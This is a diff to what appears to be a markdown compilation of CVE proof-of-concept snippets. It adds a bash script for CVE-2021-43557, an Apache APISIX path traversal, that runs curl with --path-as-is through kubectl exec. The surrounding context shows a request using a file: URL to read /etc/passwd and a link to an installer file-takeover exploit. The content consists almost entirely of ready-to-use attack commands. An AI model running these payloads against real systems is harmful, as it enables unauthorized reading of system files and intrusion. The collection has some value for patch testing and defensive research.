@@ -52,6 +52,13 @@ GET /api/geojson?url=file:/etc/passwd HTTP/1.1
 Ref:https://github.com/klinix5/InstallerFileTakeOver
 ```
 
+CVE-2021-43557 Apache APISIX: Path traversal in request_uri variable
+```
+#/bin/bash
+
+kubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H 'Host: app.test'
+```
+
 ### Note
 
 All content comes from the Internet, if there is a copyright problem, please contact me to delete.
